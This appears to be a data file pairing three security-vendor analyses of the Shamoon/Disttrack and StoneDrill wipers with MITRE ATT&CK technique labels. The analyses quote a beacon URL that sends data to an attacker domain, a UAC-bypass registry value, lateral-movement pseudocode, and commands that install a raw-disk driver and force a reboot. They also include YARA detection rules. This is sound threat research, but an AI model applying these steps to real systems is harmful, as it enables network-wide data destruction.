{
    "https://www.symantec.com/connect/blogs/shamoon-attacks": {
        "url": "https://www.symantec.com/connect/blogs/shamoon-attacks",
        "mitre_domain": [
            "enterprise-attack"
        ],
        "tactic_name": [
            "impact"
        ],
        "tech_name": [
            "Disk Structure Wipe",
            "Data Destruction",
            "Disk Structure Wipe"
        ],
        "tech_id"  : [
            "T1487",
            "T1485",
            "T1561.002"
        ],
        "text": "\nEndpoint Protection - Symantec Enterprise\nProducts\nApplications\nSupport\nCompany\nHow To Buy\nSkip to main content (Press Enter).\nSign in\nSkip auxiliary navigation (Press Enter).\nRegister\nSkip main navigation (Press Enter).\nToggle navigation\nSearch Options\nHomeMy CommunitiesCommunities All CommunitiesEnterprise SoftwareMainframe SoftwareSymantec EnterpriseBlogs All BlogsEnterprise SoftwareMainframe SoftwareSymantec EnterpriseEvents All EventsEnterprise SoftwareMainframe SoftwareSymantec EnterpriseWater CoolerGroups Enterprise SoftwareMainframe SoftwareSymantec EnterpriseMembers\nEndpoint Protection\n\u00c2\u00a0View Only\nCommunity Home\nThreads\nLibrary\nEvents\nMembers\nBack to Library\nThe Shamoon Attacks\n1\nRecommend\nAug 16, 2012 11:37 AM\nA L Johnson\nW32.Disttrack is a new threat that is being used in specific targeted attacks against at least one organization in the energy sector.\nIt is a destructive malware that corrupts files on a compromised computer and overwrites the MBR (Master Boot Record) in an effort to render a computer unusable.\nW32.Disttrack consists of several components:\nDropper\u2014the main component and source of the original infection. It drops a number of other modules.\nWiper\u2014this module is responsible for the destructive functionality of the threat.\nReporter\u2014this module is responsible for reporting infection information back to the attacker.\nDropper Component\nThe Dropper component performs the following actions:\nCopies itself to %System%\\trksvr.exe\nDrops the following files embedded into resources:\nA 64-bit version of the dropper component: %System%\\trksrv.exe (contained in the \u201cX509\u201d resource)\nReporter component: %System%\\netinit.exe (contained in the \"PKCS7\" resource)\nWiper component: %System%\\[NAME SELECTED FROM LIST].exe (contained in the \"PKCS12\" resource)\nNote: The name of the component is selected from the following list:\ncaclsrv\ncertutl\nclean\nctrl\ndfrag\ndnslookup\ndvdquery\nevent\nextract\nfindfile\nfsutl\ngpget\niissrv\nipsecure\nmsinit\nntx\nntdsutl\nntfrsutil\nntnw\npower\nrdsadmin\nregsys\nrouteman\nrrasrv\nsacses\nsfmsc\nsigver\nsmbinit\nwcscript\nCopies itself to the following network shares:\nADMIN$\nC$\\\\WINDOWS\nD$\\\\WINDOWS\nE$\\\\WINDOWS\nCreates a task to execute itself\nCreates the following service to start itself whenever Windows starts:\nService name: TrkSvr\nDisplay name: Distributed Link Tracking Server\nImage path: %System%\\trksvr.exe\nWiper Component\nThe Wiper component includes the following functionality:\nDeletes an existing driver from the following location and overwrites it with another legitimate driver:\n%System%\\drivers\\drdisk.sys\nThe device driver is a clean disk driver that enables user-mode applications to read and write to disk sectors. The driver is used to overwrite the computer\u2019s MBR but may be used for legitimate purposes.\nThe file is digitally signed\nExecutes the following commands that collect file names, which will be overwritten and writes them to f1.inf and f2.inf:\nFiles from the f1.inf and f2.inf will be overwritten with the JPEG image shown below. Overwritten files are thus rendered useless.\nFigure 1. Image used to overwrite files\nFinally, the component will overwrite the MBR so that the compromised computer can no longer start\nThe following string that points to the location of debug symbols was left in the Wiper component of this threat and gives an idea of where the component was located on the developer\u2019s computer:\nC:\\Shamoon\\ArabianGulf\\wiper\\release\\wiper.pdb\nReporter Component\nThe Reporter component is responsible for sending infection information back to the attacker. Information is sent as a HTTP GET request and is structured as follows:\nhttp://[DOMAIN]/ajax_modal/modal/data.asp?mydata=[MYDATA]&uid=[UID]&state=[STATE]\nThe following data is sent to the attacker:\n[DOMAIN]\u2014a domain name\n[MYDATA]\u2014a number that specifies how many files were overwritten\n[UID]\u2014the IP address of the compromised computer\n[STATE]\u2014a random number\nThreats with such destructive payloads are unusual and are not typical of targeted attacks. Symantec Security Response is continuing to analyze this threat and will post more information as it becomes available. Symantec customers are protected from this threat, which our security products detect as W32.Disttrack.\nStatistics\n0\nFavorited\n0\nViews\n0\nFiles\n0\nShares\n0\nDownloads\nTags and Keywords\nRelated Entries and Links\nNo Related Resource entered.\nProducts\nApplications\nSupport\nCompany\nHow To Buy\nCopyright \u00c2\u00a9 2005-2022 Broadcom. All Rights Reserved. The term \"Broadcom\" refers to Broadcom Inc. and/or its subsidiaries. Hosted by Higher Logic, LLC on the behalf of Broadcom - Privacy Policy | Cookie Policy | Supply Chain Transparency\nTerms of Use\nCopyright 2019. All rights reserved.\nPowered by Higher Logic\n"
    },
    "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/": {
        "url": "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/",
        "mitre_domain": [
            "enterprise-attack"
        ],
        "tactic_name": [
            "impact",
            "defense-evasion"
        ],
        "tech_name": [
            "Disk Structure Wipe",
            "Masquerade Task or Service",
            "Data Destruction",
            "Disk Structure Wipe"
        ],
        "tech_id": [
            "T1487",
            "T1036.004",
            "T1485",
            "T1561.002"
        ],
        "text": "\nShamoon 2: Return of the Disttrack Wiper\nProtect Against Russia-Ukraine Cyber Activity\nMenu\nTools\nATOMs\nSecurity Consulting\nAbout Us\nUnder Attack?\nShamoon 2: Return of the Disttrack Wiper\n75,737\npeople reacted\n1\n9\nmin. read\nShare\nBy Robert Falcone\nNovember 30, 2016 at 5:20 PM\nCategory: Unit 42\nTags: Disttrack Wiper, EMEA, Saudi Arabia, Shamoon 2, threat intelligence\nThis post is also available in:\n\u65e5\u672c\u8a9e (Japanese)In August 2012, an attack campaign known as Shamoon targeted a Saudi Arabian energy company to deliver a malware called Disttrack. Disttrack is a multipurpose tool that exhibits worm-like behavior by attempting to spread to other systems on a local network using stolen administrator credentials. More importantly, its claim to fame is the ability to destroy data and to render infected systems unusable. The attack four years ago resulted in 30,000 or more systems being damaged.\nLast week, Unit 42 came across new Disttrack samples that appear to have been used in an updated attack campaign. The attack targeted at least one organization in Saudi Arabia, which aligns with the targeting of the initial Shamoon attacks. It appears the purpose of the new Disttrack samples were solely focused on destruction, as the samples were configured with a non-operational C2 server to report to and were set to begin wiping data exactly on 2016/11/17 20:45. In another similarity to Shamoon, this is the end of the work week in Saudi Arabia (their work week is from Sunday to Thursdays), so the malware had potentially the entire weekend to spread.\nThe 2012 Shamoon attacks took place on Lailat al Qadr, the holiest night of the year for Muslims; another time the attackers could be reasonably certain employees would not be at work.\nComposition of Disttrack\nDisttrack is comprised of three distinct parts: the dropper, communications and wiper components. The main Disttrack executable is a dropper that extracts additional tools from embedded resources and coordinates when to save and execute them. Embedded within each Disttrack sample is a component responsible for communicating with a C2 server and a separate component used to carry out the wiping functionality.\nThe dropper extracts the communications and wiper components from resources named \"PKCS7\" and \"PKCS12\" respectively, while the x86 sample extracts the x64 variant of Disttrack from a resource named \u201cX509\u201d. To extract the components, the dropper is configured to seek specific offsets within the resource, read a specified number of bytes and decrypt the contents using a specified key. The key exists in the sample as a base64 encoded string that the dropper will decode then use each byte of the resulting string to XOR the data obtained from the resource. When determining the location of the ciphertext within the resource, the dropper subtracts 14 from the offset value in the sample's configuration as an additional layer of obfuscation. Table 1 shows the resources within the Disttrack x86 sample, the component it contains and the values needed to decrypt its contents.\nComponent\nResource Name\nOffset\nSize\nBase64 key\nx64 Variant\nX509\n812 -14 = 798\n717312\n5tGLQqku0m02...\nCommunications\nPKCS7\n879 -14 = 865\n159744\nUPi0IzQOAyiL...\nWiper\nPKCS12\n792 -14 = 778\n282112\n3Lmqr/nJgzFZ7...\nTable 1 Resources containing Disttrack components\nDisttrack Functionality\nDisttrack is mainly focused on data destruction and attempting to damage as many systems as possible. To do so, this malware attempts to spread to other systems on network using what are likely stolen administrator credentials. This is again similar to the 2012 Shamoon attacks, where compromised but legitimate credentials obtained in advance of the attacks were also hard coded into the malware to aid in its propagation. Disttrack also has the ability to download and execute additional applications to the system, as well as remotely set the date to start wiping systems.\nLocal Network Spreading\nThe Disttrack malware spreads to other systems automatically using stolen credentials. The Disttrack we analyzed contained the internal domain names and administrator credentials associated with the targeted organization. The internal domain and credentials appear to be stolen prior to the creation of this tool, as it is not a public domain and the credentials are not weak enough to have obtained through guessing, brute force or dictionary attacks.\nDisttrack uses the internal domain names and credentials to log into remote systems on the same network segment. The malware determines the local network segment associated with the target system (call to gethostname) by obtaining the IP address for the system (call to gethostbyname). It then uses the system's IP addresses to enumerate the /24 network (x.x.x.0-255) that the system is networked with, and will attempt to spread to each of these remote systems.\nThe dropper then attempts to open the service manager on each remote system to start the RemoteRegistry service, which it will connect to using RegConnectRegistryW. Once connected, the dropper attempts to disable UAC (User Access Control) remote restrictions by setting the following registry key to a value of \"1\":\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy\nAfter disabling UAC, the dropper connects to the remote system (using NetUseAdd) and logs in using the embedded stolen credentials. The dropper then checks to see if it has administrator privileges on the remote system by attempting to open \"\\system32\\csrss.exe\", which allows it to determine if it can write its payload to the \"\\system32\" folder on the remote system. The dropper then has two different methods in which it can pivot to the remote system.\nThe first method involves the dropper writing itself to \"\\system32\\ntssrvr32.exe\" on the remote system. After writing itself to the remote system, the dropper creates a service named \"ntssrv\", with a display name of \"Microsoft Network Realtime Inspection Service\" and a description of \"Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols\" to execute the payload.\nThe second, alternative method also involves the dropper copying itself to \"\\system32\\ntssrvr32.exe\" on the remote system; however, instead of creating a remote service, this method calls the NetScheduleJobAdd function within the Windows netapi32 library to create a scheduled task to run the payload. Scheduled tasks require a time in which the task will run, which the dropper determines by calling the function NetRemoteTOD to obtain the time of day from the remote system. The dropper then adds 90 seconds to the time of day value on the remote system and uses this value as the \"JobTime\" to run the task in three minutes, which executes the payload on the remote system. The following pseudo-code shows the scheduled task creation process:\nNetRemoteTOD(UncServerName, &BufferPtr)\nNetApiBufferAllocate(0x10u, &AT_INFO)\nAT_INFO->Command = s_pathToPayload;\nAT_INFO->JobTime = 1000\n* (BufferPtr->tod_secs\n+ 60 * (BufferPtr->tod_mins + 60 * BufferPtr->tod_hours - BufferPtr->tod_timezone)\n+ 90);\nAT_INFO->Flags = JOB_NONINTERACTIVE;\nAT_INFO->DaysOfMonth = 0;\nAT_INFO->DaysOfWeek = 0;\nNetScheduleJobAdd(UncServerName, AT_INFO, &v16)\n1234567891011\nNetRemoteTOD(UncServerName, &BufferPtr)NetApiBufferAllocate(0x10u, &AT_INFO)AT_INFO->Command = s_pathToPayload;AT_INFO->JobTime = 1000 * (BufferPtr->tod_secs\n+ 60 * (BufferPtr->tod_mins + 60 * BufferPtr->tod_hours - BufferPtr->tod_timezone)\n+ 90);AT_INFO->Flags = JOB_NONINTERACTIVE;AT_INFO->DaysOfMonth = 0;AT_INFO->DaysOfWeek = 0;NetScheduleJobAdd(UncServerName, AT_INFO, &v16)\nC2 Communications\nDisttrack extracts the communication component from its resource named \u201cPKCS7\u201d, decrypts it and saves the resulting cleartext to the file %WINDOWS%\\system32\\netinit.exe.\nThe communication module interacts with its C2 server using HTTP requests. The communications modules in both the x86 and x64 variants of Disttrack we analyzed were configured to use \u201c1.1.1.1:8080\u201d for its C2 server, which does not host an operational Disttrack C2 server. The lack of an operational C2 server suggests that the threat actors did not desire remote access to infected systems, rather the actors sought to render them unusable instead. If the modules were configured with an operational C2 server,\nthe module would generate an HTTP GET request that resembles the following:\nThe interesting part of the request above is that the host \"server\", the URL \"category/page.php\", the parameter \"shinu\" and the user-agent \"Mozilla/5.0 (MSIE 7.1; Windows NT 6.0)\" are hardcoded into the tool. The data in \"shinu\" parameter is a combination of the system's tickcount, local IP address, operating system version, keyboard layout and the contents of %WINDOWS%\\inf\\netimm173.pnf. The C2 server can respond to this HTTP request with one of the following two commands:\nCommand\nDescription\nE\nProvides an executable to run on the system. The executable is saved to %TEMP%\\Temp\\filer\\<tickcount>.exe\nT\nSets the time to start wiping the system, by writing the date to %WINDOWS%\\inf\\usbvideo324.pnf.\nWe believe the HTTP host value of \"server\" and the non-operational \"1.1.1.1\" C2 address may suggest that the communication module is created with a builder tool, which in this case the actor mistakenly or purposefully did not provide an active C2 server when building this module. While completely speculative, the word \u201cshinu\u201d used as a parameter could be a reference to the Arabic slang for the word \u201cwhat\u201d, as well as a reference to a village name in northwestern Iran.\nDisttrack Data Destruction\nThe Disttrack dropper is responsible for installing the wiper component of this Trojan, however, it will only activate this component if the system time is greater than a preset date. The dropper obtains a date used to activate the wiping functionality by reading a specific file, or using a hardcoded timestamp of \"2016/11/17 20:45\". The file containing this timestamp is named \"\\inf\\usbvideo324.pnf\", which is not initially installed but is provided by the C2 server if it sends the communications module the \"T\" command. The \"usbvideo324.pnf\" file would have the following structure:\nBYTE year;\nBYTE month;\nBYTE day;\nBYTE hour;\nBYTE year;\nBYTE minute;\nIf the dropper determines the system date is larger than the specified date, the dropper will extract the wiper component from a resource named \"PKCS12\" and save it to the \"system32\" folder with one of the following filenames appended with a \".exe\" extension:\ncaclsrv\ncertutl\nclean\nctrl\ndfrag\ndnslookup\ndvdquery\nevent\nfindfile\ngpget\nipsecure\niissrv\nmsinit\nntfrsutil\nntdsutl\npower\nrdsadmin\nregsys\nsigver\nrouteman\nrrasrv\nsacses\nsfmsc\nsmbinit\nwcscript\nntnw\nnetx\nfsutl\nextract\nThe dropper then runs the wiper component with a command line argument of \"1\". The wiper component extracts a driver from its resource section and decrypts it with a 226 byte XOR key. The wiper saves the extracted driver to \"C:\\Windows\\System32\\Drivers\\drdisk.sys\" and installs the kernel driver by creating a service named \"drdisk\" with the following command line commands:\nsc create drdisk type= kernel start= demand binpath=\nSystem32\\Drivers\\drdisk.sys 2>&1 >nul\nsc start drdisk 2>&1 >nul\n123\nsc create drdisk type= kernel start= demand binpath= System32\\Drivers\\drdisk.sys 2>&1 >nulsc start drdisk 2>&1 >nul\nThe kernel driver is a commercial product that the attackers are abusing called RawDisk by EldoS Corporation, which provides direct access to files, disks and partitions. It appears that the \u201cdrdisk.sys\u201d driver (SHA256: 4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6) is the exact same driver as used in the Shamoon attack in 2012. With the kernel driver installed, the wiper can begin writing to protected system locations, such as the master boot record (MBR) and partition tables of storage volumes. The wiper can be configured to overwrite files in three different ways, specified by a configuration setting of \"F\", \"R\" or \"E\". If configured with the \"F\" setting, the wiper loads a resource named AJKEOA, which extracts a JPEG image to use to overwrite files and partition tables. If the wiper is configured with the \"E\" setting, the wiper will encrypt the contents of the file using a random value as a key and the RC4 algorithm. If configured with the \"R\" setting, the wiper will overwrite files with the random values that would be used as a key in \"E\".\nThe sample we analyzed was configured with \"F\", meaning it would overwrite files with an image obtained from its resource section. The image extracted is a picture of a Syrian boy named Alan Kurdi, whose drowning on September 2, 2015 received international attention in regards to the ongoing Syrian refugee crisis. The previous Shamoon attack in 2012 used an image of a burning American flag, continuing the political image theme.\nFrom a functionality standpoint, the wiper relies on EldoS' RawDisk driver to overwrite files on the system. During this activity, we noticed the wiper changing the system time to August 2012, as the temporary license key for the RawDisk driver requires the system time to not exceed the month of August, which is when the temporary license would expire. This modification to the system time was seen in the previous campaign, and the temporary license key within the wiper component is the exact same as wiper component from the 2012 attacks. The wiper itself queries the following registry keys to obtain a list of partitions to overwrite:\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareBootDevice\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemBootDevice\n12\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareBootDeviceHKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemBootDevice\nIn addition to these partitions, the wiper attempts to overwrite files and subfolders within in the following folders:\nC:\\Documents and Settings\nC:\\Users\nC:\\Windows\\System32\\Drivers\nC:\\Windows\\System32\\Config\\systemprofile\n1234\nC:\\Documents and SettingsC:\\UsersC:\\Windows\\System32\\DriversC:\\Windows\\System32\\Config\\systemprofile\nAfter overwriting these files and the partition tables, the wiper issues the following command to restart the system:\nshutdown -r -f -t 2\n1\nshutdown -r -f -t 2\nThe arguments and switches used in the \u201cshutdown\u201d command above forces all running applications to close and causes the system to reboot (\u2018-r\u2019) after 2 seconds (\u2018-t 2\u2019). This command does result in a dialog prompt, seen in Figure 1, that informs the user that the system is shutting down.\nFigure 1 Dialog prompt displayed when the Wiper component runs the 'shutdown' command\nWith the partition tables overwritten, the system will no longer be able to properly boot, which renders the system unusable. During analysis, our analysis system was rendered unusable, as the virtual machine was unable to find the operating system during boot up, as seen in Figure 2.\nFigure 2 Analysis virtual machine unable to boot after executing Disttrack Wiper\nConclusion\nAfter a four year hiatus, threat actors likely associated with the Shamoon attack campaign have used their Disttrack malware to target at least one organization in Saudi Arabia. The current attack campaign has several TTP overlaps with the original Shamoon campaign, especially from a targeting and timing perspective. Also, Disttrack malware used in the recent attacks is very similar to the variant used in the 2012 attacks, which uses the exact same RawDisk device driver as well (down to the same, temporary license key).. The main purpose of the Disttrack malware is to overwrite files and storage partitions in an attempt to destroy data and render the system unusable. To maximize its destruction, the Disttrack tool attempts to spread to other systems on the network using stolen administrator credentials, which suggests that the threat actors had previous access to the network or carried out successful phishing attacks prior to the attack using Disttrack.\nPalo Alto Networks customers are protected from Disttrack:\nAll known samples have a malicious verdict in WildFire\nAutoFocus customers can monitor Disttrack activity via the Disttrack tag\nIndicators of Compromise\nDisttrack Droppers\n47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34 (x64)\n394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\n(x86)\nCommunication Components\n772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5 (x64)\n61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842 (x86)\nWiper Components\nc7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a (x64)\n128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd (x86)\nEldoS RawDisk Samples\n5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a (x64)\n4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6 (x86)\nGet updates from\nPalo Alto Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nPlease enter your email address!\nPlease mark, I'm not a robot!\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\nPopular ResourcesResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemap\nLegal NoticesPrivacy\nTerms of Use\nDocuments\nAccountManage Subscriptions\nReport a Vulnerability\n\u00a9 2022 Palo Alto Networks, Inc. All rights reserved.\n"
    },
    "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf": {
        "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf",
        "mitre_domain": [
            "enterprise-attack"
        ],
        "tactic_name": [
            "impact"
        ],
        "tech_name": [
            "Disk Structure Wipe",
            "Data Destruction",
            "Disk Structure Wipe"
        ],
        "tech_id": [
            "T1487",
            "T1485",
            "T1561.002"
        ],
        "text": "FROM SHAMOON TO STONEDRILL\nWipers attacking Saudi organi zations and beyond\nVersion 1.05\n2017-03-07,\nContact:\nintelreports@kaspersky.com\n1\nBeginning in November 2016, Kaspersky Lab observed a new wave of wiper attacks\ndirected at\nmultiple targets in the Middle East. The malware used in the new attacks was a variant of the\ninfamous\nShamoon\nworm that targeted Saudi Aramco and Rasgas back in 2012.\nDormant for four years, one of the most mysterious wipers in history has returned.\nSo far, we\nhave\nobserved three waves of attacks of the Shamoon 2.0 malware, activated on 17\nNovember 2016, 29 Nove\nmber 2016 and 23 January 2017.\nAlso known as Disttrack, Shamoon is a highly destructive malware family that effectively wipes\nthe victim machine. A group known as the\nCutting Sword of Justice\ntook credit for the Saudi\nAramco attack by posting a\nPastebin message\non the day of the attack (back in 2012)\n,\nand\njustified the attack as a measure against the Saudi monarchy.\nThe\nShamoon 2.0 attacks observed\nsince November 2016 have targeted\norganizations in\nvarious critic\nal and economic sectors in Saudi Arabia. Just like the previous variant, the\nShamoon 2.0 wiper aims for the mass destruction of systems inside targeted organizations.\nThe new attacks share\nmany\nsimilarities with the 2012 wave, though featuring new tools a\nnd\ntechniques. During the first stage, the attackers obtain administrator credentials for the victim\u2019s\nnetwork. Next, they build a custom wiper (Shamoon 2.0) which leverages these credentials to\nspread wide\nly\ninside the organization. Finally, on a predefin\ned date, the wiper activates\n,\nrendering the victim\u2019s machines completely\ninoperable\n. It should be noted that the final stages\nof the attacks have their activity completely automated, without the need for communication with\nthe\ncommand and control center.\nW\nhile\ni\nnvestigating the Shamoon 2.0 attacks, Kaspersky Lab also discovered a previously\nunknown wiper malware which appears to be targeting organizations in Saudi Arabia. We\u2019re\ncalling this new wiper\nStoneDrill\n. StoneDrill has several \u201cstyle\u201d similarities t\no Shamoon\n,\nwith\nmultiple interesting factors and techniques to allow for\nthe\nbetter evasion of detection. In\naddition to suspected Saudi targets, one victim of StoneDrill was observed on the Kaspersky\nSecurity Network (KSN) in Europe. This makes us believe\nthe threat actor behind StoneDrill is\nexpanding\nits\nwiping operations from the Middle East to Europe.\nTo summarize some of the characteristics of the new wiper attacks, for both Shamoon and\nStoneDrill:\n\u25cf\nShamoon 2.0 includes a fully functional ransomware mo\ndule, in addition to its common\nwiping functionality.\n\u25cf\nShamoon 2.0 has both 32\n-\nbit and 64\n-\nbit components\n.\n\u25cf\nThe Shamoon samples we analyzed in January 2017 do not implement any command\nand control (C&C) communication; previous ones included a basic C&C functi\nonality that\nreferenced local servers in the victim\u2019s network.\n\u25cf\nStoneDrill\nmakes heavy use\nof evasion techniques to avoid sandbox execution\n.\n\u25cf\nWhile Shamoon embeds Arabic\n-\nYemen resource language sections, StoneDrill embeds\nmostly Persian resource language sec\ntions. Of course, we do not exclude the possibility\nof false flags.\n\u25cf\nStoneDrill does not use drivers during deployment (unlike Shamoon)\nbut\nrelies on\nmemory injection of the wiping module into the victim\u2019s preferred browser.\n,\nContact:\nintelreports@kaspersky.com\n2\n\u25cf\nSeveral similarities exist between Shamoon and StoneDrill\n.\n\u25cf\nMultiple similarities were found between StoneDrill and previously analysed\nNews\nB\neef\nattacks\n.\nWhat is new\nin this report?\nThis report provides new insights into the Shamoon 2.0 and StoneDrill attacks, including:\n1.\nThe discovery techniques and strategies we used for Shamoon and StoneDrill\n.\n2.\nDetails on the ransomware functionality found in Shamoon 2.0. This func\ntionality is\ncurrently inactive but could be used in future attacks\n.\n3.\nDetails on the\nnewly found\nStoneDrill functions, including\nits\ndestructive capabilities\n(even with limited user privileges)\n.\n4.\nDetails on\nthe\nsimilarities between malware styles and malware\ncomponents\n\u2019\nsource\ncode found in Shamoon, StoneDrill and NewsBeef\n.\n,\nContact:\nintelreports@kaspersky.com\n3\n1. From Shamoon to StoneDrill: the discovery\n1.1. Shamoon: It\u2019s all about the \u201cresources\u201d\nFew people ever expected the return of Shamoon after\nfour\nyears of silence. This made the\nnews\nfrom the Middle East on 17 November 2016 quite surprising\n,\nand sent multiple\nshock\nwaves\nthrough the industry. After the second wave of attacks, which took place on 29\nNovember 2016, it became quite clear that Shamoon 2.0 was no longer\nan isolated\nincident,\nbut\npart of a new series of attacks and\nwe should\nexpect more waves coming\nin\n. In order to make\nsure\nthat\nKaspersky Lab customers\nwere\nprotected, we started to develop specific detection\nstrategies and hunt for possible new variants.\nTo create the new det\nections, we used multiple ideas:\n\u25cf\nThe Shamoon wipers have their additional payloads stored as encrypted resources.\n\u25cf\nJust like in 2012, the early Shamoon 2.0 samples used resources with\nthree\nvery\nspecific names\n-\n\"PKCS7\", \"PKCS12\" and \"X509\". Because of thei\nr uniqueness it was\nrelatively easy to find and detect them just by the resource names\nand their\nhigh\nentropy. Unfortunately, newer versions had random resource names like \"ICO\", \"LANG\"\nand \"MENU\", so the ability to easily find new samples was lost.\nHowev\ner, all programmers, especially malware writers, have their own habits, and the authors\nof\nShamoon are no exception:\n\u25cf\nSince the Shamoon 1\n.0\nstory\n,\nfrom 2012 (6dd571b84470ad9caad30a6a6acf491e)\nuntil\n2016 (2cd0a5f1e9bcce6807e57ec8477d222a) many samples had one\nadditional\nencrypted resource with a specific, although non\n-\nunique name \"101\".\nThis finding got us thinking\nthat\nthe Shamoon attackers can re\n-\nuse this pattern and we\u2019ve\ninvestigated ways of usi\nng this to hunt for new, unknown malware generations from their side.\nAs researchers, we tested a lot of different approaches to\nfind similar malicious\nsamples based\non this\nartefact\n, and one of them worked unexpectedly. Here\u2019s the logic we used to create\nthe\ndetection:\n1.\nWe assumed that for\nthe\nnext waves of attack the authors\nwould\ncontinue to recompile\nthe\nShamoon 2\n.0\nversion from 2016, while trying to avoid AV detection, so we focused\nmostly on the newest Shamoon versions\n.\n2.\nWe assumed that the wiper\nwould\nagain enumerate all files inside folders, so it\nw\nould\nstill\ncall Windows API functions FindFirstFile and FindNextFile\n.\n3.\nBecause\nit uses\nencrypted resources, we assumed that it would find and load them with\nthe Windows API functions FindResource and LoadReso\nurce\n.\n4.\nInside all known\nversions of\nShamoon 2\n.0\n, the resource \"101\" was found, with the\nfollowing properties:\n\u25cf\nLevel of entropy > 7.8\n-\nthat means the data inside is encrypted or compressed\n.\n,\nContact:\nintelreports@kaspersky.com\n4\n\u25cf\nSize about 30\nKB\n-\nwe\u2019ve decided to set the minimum limit at 20 KB\n.\n\u25cf\nLanguage = neutral (not set); all other resources had\nthe\nlanguages \"Arabic\n(Yemen)\" or \"English United States\"\n.\n\u25cf\nDoes not contain an unencrypted PE executable file inside\n.\nAfter initial testing, we decided to add more search criteria to limit the number\nof possible false\npositive detections:\n\u25cf\nShamoon samples had no digital signature, so the sample would be unsigned\n.\n\u25cf\nAll known Shamoon samples with resource \"101\" had a maximum file size of 370 KB, so\nit's reasonable to limit the file size to twice that numbe\nr\n-\n700 KB.\n\u25cf\nThe number of resources inside the sample should not be too high\n-\nless than 15\n.\nOur favorite malware hunting tool,\nYara\n, provides a rule\n-\nbused approach to create descriptions of\nmalware\nfamilies based on textual or binary patterns\n.\nHere\u2019s the detection rule we wrote using all the above conditions:\nimport \"pe\"\nimport \"math\"\nrule susp_file_enumerator_with_encrypted_resource_101 {\nmeta:\ncopyright = \"Kaspersky Lab\"\ndescription = \"Generic\ndetection for samples that enumerate files with encrypted resource\ncalled 101\"\nhash = \"2cd0a5f1e9bcce6807e57ec8477d222a\"\nhash = \"c843046e54b755ec63ccb09d0a689674\"\nversion = \"1.4\"\nstrings:\n$mz = \"This program cannot be run in DOS mode.\"\n$a1 = \"Find\nFirstFile\" ascii wide nocase\n$a2 = \"FindNextFile\" ascii wide nocase\n$a3 = \"FindResource\" ascii wide nocase\n$a4 = \"LoadResource\" ascii wide nocase\ncondition:\nuint16(0) == 0x5A4D and\nall of them and\nfilesize < 700000 and\npe.number_of_sections\n> 4 and\npe.number_of_signatures == 0 and\npe.number_of_resources > 1 and pe.number_of_resources < 15 and\nfor any i in (0..pe.number_of_resources\n-\n1):\n(\n(math.entropy(pe.resources[i].offset, pe.resources[i].length) > 7.8) and\npe.resources[i].id == 1\n01 and\npe.resources[i].length > 20000 and\npe.resources[i].language == 0 and\n,\nContact:\nintelreports@kaspersky.com\n5\nnot ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))\n)\n}\nWhile running the above Yara rule on Kaspersky\nLab\u2019s\nsamples selection\n,\nwe\nfound an\ninteresting, fresh sample. After a quick analysis, we realized it was yet another wiper\n. H\nowever,\nit was not Shamoon\n,\nbut something different. We\u2019ve decided to call it StoneDrill.\n1.2. From StoneDrill to\nNewsBeef\nHaving identified the StoneDrill\nsample through the Yara technique above, we started looking\nfor other possibly related samples.\nOne Yara technique that\nhas\nproved useful in the past for finding new malware variants is the\ndevelopment of Yara rules for decrypted malware components. Durin\ng attacks, malware\ncomponents can be changed to fit the attackers\u2019 requirements\n,\nso\nhunting for decrypted\nmalware code might help in finding new malware variants or even older samples.\nWith StoneDrill, we developed several Yara rules for the decrypted payl\noads. Here\u2019s one of our\nYara rules for a decrypted StoneDrill module:\nrule StoneDrill_main_sub {\nmeta:\nauthor\n= \"Kaspersky Lab\"\ndescription\n= \"Rule to detect StoneDrill (decrypted) samples\"\nhash\n= \"d01781f1246fd1b64e09170bd6600fe1\"\nhash\n= \"ac3c25534c076623192b9381f926ba0d\"\nversion\n= \"1.0\"\nstrings:\n$code = {B8 08 00 FE 7F FF 30 8F 44 24 ?? 68 B4 0F 00 00 FF 15 ?? ?? ?? 00 B8 08 00 FE 7F FF\n30 8F 44 24 ?? 8B ?? 24 [1\n-\n4] 2B ?? 24 [6] F7 ?1 [5\n-\n12] 00}\ncondit\nion:\nuint16(0) == 0x5A4D and\n$code\nand\nfilesize < 5000000\n}\nInterestingly, this rule allowed us to find a new category of samples, which we previously\nconnected with a threat actor named News\nB\neef. We wrote about\nNews\nB\neef\nroughly one year\nago, in relation to another set of attacks against oil and energy companies from the Middle East\n.\n,\nContact:\nintelreports@kaspersky.com\n6\nFurther analysis indicated the malware sam\nples from StoneDrill and News\nB\neef appear to be\nconnected together through numerous internal similarities.\nThe use of simple logic in conjunction with\na\nknowledge of Yara can help attain\na\nstate\n-\nof\n-\nthe\n-\nart\noutcome in malware hunting activity. If you would l\nike to learn more, you can join us\nfor\nthe Yara\ntraining\n\"\nHunt APTs with Yara like a GReAT Ninja\n\"\nand the advanced\n\u201c\nMalware Reverse\nEngineering course\n\u201d\non April 1\n-\n2, 2017 in St. Maarten\n.\nSeveral private intelligence reports on 